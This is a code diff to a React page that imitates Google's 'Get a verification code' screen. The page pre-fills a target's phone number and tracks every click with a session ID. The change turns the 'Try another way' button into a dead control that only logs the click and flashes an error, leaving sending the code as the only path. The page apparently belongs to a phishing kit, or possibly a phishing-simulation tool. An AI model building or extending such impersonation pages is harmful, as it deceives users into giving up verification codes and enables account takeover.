@@ -56,6 +56,12 @@ ${GE_SHELL_CSS}
   font-weight: 500;
   color: var(--gm3-on-surface);
 }
+.ge-send-help.is-error strong {
+  color: #f28b82;
+  outline: 1px solid #f28b82;
+  outline-offset: 2px;
+  border-radius: 2px;
+}
 @media (min-width: 900px) {
   .ge-send .ge-pane-right {
     padding-top: 72px;
@@ -73,31 +79,6 @@ ${GE_SHELL_CSS}
   .ge-form { margin-top: 22px; }
 }
 
-.ge-actions {
-  display: flex;
-  flex-direction: row;
-  flex-wrap: wrap;
-  align-items: center;
-  justify-content: space-between;
-  margin-top: auto;
-  padding-top: 32px;
-  gap: 8px;
-  width: 100%;
-}
-.ge-btn-text {
-  background: none;
-  border: none;
-  padding: 0 12px;
-  height: 40px;
-  border-radius: 20px;
-  color: var(--gm-next-fill);
-  font-family: inherit;
-  font-size: 0.875rem;
-  font-weight: 500;
-  letter-spacing: 0.0107142857em;
-  cursor: pointer;
-}
-.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
 .ge-btn {
   display: inline-flex;
   align-items: center;
@@ -127,6 +108,7 @@ function GeSendCodePage() {
   const { trackClick, trackSubmit, geNavigate, sessionId, isObserve } = useGeTracking();
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [phone, setPhone] = useState(() => resolveGePhone());
+  const [flashError, setFlashError] = useState(false);
 
   useEffect(() => {
     const resolvedEmail = resolveGeEmail();
@@ -167,6 +149,12 @@ function GeSendCodePage() {
 
   const displayPhone = formatGePhoneDisplay(phone);
 
+  const handleTryAnother = () => {
+    trackClick("Try another way");
+    setFlashError(true);
+    window.setTimeout(() => setFlashError(false), 1600);
+  };
+
   const handleSend = (e?: FormEvent) => {
     e?.preventDefault();
     trackClick("Send");
@@ -193,18 +181,14 @@ function GeSendCodePage() {
 
         <div className="ge-pane-right">
           <p className="ge-send-heading">Get a verification code</p>
-          <p className="ge-send-help">
+          <p className={`ge-send-help${flashError ? " is-error" : ""}`}>
             Google will send a verification code to <strong>{displayPhone}</strong>.
             Standard message and data rates may apply.
           </p>
 
           <form className="ge-form" onSubmit={handleSend} autoComplete="off">
             <div className="ge-actions">
-              <button
-                type="button"
-                className="ge-btn-text"
-                onClick={() => trackClick("Try another way")}
-              >
+              <button type="button" className="ge-btn-text" onClick={handleTryAnother}>
                 Try another way
               </button>
               <button type="submit" className="ge-btn ge-btn-send">
